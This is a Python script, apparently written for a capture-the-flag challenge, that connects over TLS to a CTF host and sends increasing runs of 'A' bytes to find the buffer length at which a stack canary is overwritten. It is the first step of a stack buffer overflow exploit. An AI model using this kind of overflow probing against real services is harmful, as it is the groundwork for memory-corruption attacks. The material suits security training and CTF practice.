import socket
import ssl
import time
import sys

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

def connect():
    try:
        raw = socket.create_connection((HOST, PORT), timeout=5)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(raw, server_hostname=HOST)
        return ss
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

def check_crash(length):
    s = connect()
    if not s: sys.exit(1)
    try:
        s.sendall(str(length).encode() + b"\n")
        time.sleep(0.1)
        s.sendall(b"A" * length)
        s.settimeout(1.5)
        buf = b""
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            buf += chunk
            if b"stack smashing detected" in buf:
                s.close()
                return True # Crashed (caught)
        s.close()
        if b"Santa is missing" in buf:
            return False # Survived
        return True # Probably crashed (silent)
    except TimeoutError:
        s.close()
        return False # Timeout = Alive
    except Exception as e:
        s.close()
        return True # Error = Crash?

print("Checking offsets...")
for l in range(30, 60):
    crashed = check_crash(l)
    print(f"Length {l}: {'CRASHED' if crashed else 'OK'}")
    if crashed:
        print(f"First crash at {l}. Offset to canary is likely {l-1} if we overwrote byte 0 with 'A' (0x41).")
        break
